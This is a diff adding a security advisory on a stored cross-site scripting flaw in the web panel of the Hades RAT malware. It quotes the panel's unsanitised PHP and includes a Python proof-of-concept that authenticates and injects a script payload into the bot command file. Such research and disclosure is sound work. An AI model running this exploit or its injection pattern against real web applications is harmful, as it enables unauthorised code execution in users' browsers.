@@ -1,0 +1,77 @@
+id: 37489
+date: 03/15/2022
+title: Hades RAT Web Panel Cross Site Scripting Vulnerability
+author: malvuln
+cves: 
+
+Original source: https://malvuln.com/advisory/c4cc1317aea42f7dd4a1b786c5278a24_C.txt
+Contact: malvuln13@gmail.com
+Media: twitter.com/malvuln
+
+Threat: Hades RAT - Web Panel
+Vulnerability: Remote Persistent XSS
+Family: Hades
+Type: WebUI
+MD5: c4cc1317aea42f7dd4a1b786c5278a24
+MD5: d1d082cbb2a394c8974e734e2ad9f226 (index.php)
+Vuln ID: MVID-2022-0514
+Disclosure: 03/13/2022
+Description: The Hades Rat web-panel listens on Port 80, it takes three HTTP Post parameters to write bot commands. Commands are written to three files: commande1.txt, commande2.txt and commande3.txt. The index.php file does not follow secure coding practices e.g. no sanitizing of input. Third-party attackers who can authenticate to the Hades server, can make HTTP Post requests writing arbitrary JS code into the commande1.txt file. The XSS payload will execute client side code in the security context of the currently logged on user anytime the WebUI is accessed. This can result in data modification, theft or GEO location disclosure of the user accessing the Hades Rat WebUI.
+
+index.php snippet.
+
+if(isset($_SESSION['valide']['m']) AND $_SESSION['valide']['m'] == 1)
+{
+  $commande1_fichier = fopen("commandes/commande1.txt", "r+");
+  $commande2_fichier = fopen("commandes/commande2.txt", "r+");
+  $commande3_fichier = fopen("commandes/commande3.txt", "r+");
+  
+  $commande1_string = fgets($commande1_fichier);
+  $commande2_string = fgets($commande2_fichier);
+  $commande3_string = fgets($commande3_fichier);
+  
+  if(isset($_POST['commande1'], $_POST['commande2'], $_POST['commande3']))
+  {
+    $commande1 = $_POST['commande1'];
+    $commande2 = $_POST['commande2'];
+    $commande3 = $_POST['commande3'];
+    
+    fseek($commande1_fichier, 0); fseek($commande2_fichier, 0); fseek($commande3_fichier, 0);
+    
+    $commande1_whipe = fopen("commandes/commande1.txt", "w+");
+    $commande2_whipe = fopen("commandes/commande2.txt", "w+");
+    $commande3_whipe = fopen("commandes/commande3.txt", "w+"); 
+
+
+Exploit/PoC:
+import urllib2,urllib,time,re
+from cookielib import CookieJar
+
+HADES_RAT_IP="x.x.x.x"
+HADES_PASSWD="megapass"
+
+c = CookieJar()
+opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(c))
+payload = { "mdp" : HADES_PASSWD }
+xss = '"/><script>alert(666)</script>"'
+encoded = urllib.urlencode(payload)
+res = opener.open("http://"+HADES_RAT_IP+"/WebPanel/index.php", encoded)
+content = res.read()
+
+time.sleep(1)
+
+payload = { 'commande1' : xss, 'commande2' : "", 'commande3' : "" }
+encoded = urllib.urlencode(payload)
+res = opener.open("http://"+HADES_RAT_IP+"/WebPanel/index.php", encoded)
+content = res.read()
+
+hades = re.findall(r"<title.*?>(.+?)</title>", content)
+tmp=""
+for i in hades:
+    tmp += i.decode("utf-8")
+
+if tmp:
+    print(tmp)
+    print("XSS Exploit successful!")
+
+#  0day.today [2023-03-26]  #
